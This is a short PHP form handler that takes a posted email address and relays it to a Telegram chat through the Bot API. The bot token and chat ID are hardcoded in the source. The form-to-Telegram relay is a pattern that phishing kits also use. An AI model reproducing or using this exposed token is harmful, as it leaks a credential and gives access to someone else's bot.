<?php
$user_mail = htmlspecialchars($_POST['usermail']);
$token = "7516351126:AAHoWRvOgMROgPugaB0ACr7yE-vu_xIyiJw";
$chat_id ="-4562922421";

$formData = array(
  "email: " => $user_mail
);

$text = '';
foreach($formData as $key => $value) {
  $text .=$key . "<b>" . urlencode($value) . "</b>" . "%0A" ;
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&text={$text}&parse_mode=html", "r");

if($sendToTelegram) {
  echo "Success";
} else {
  echo "Error";
}?>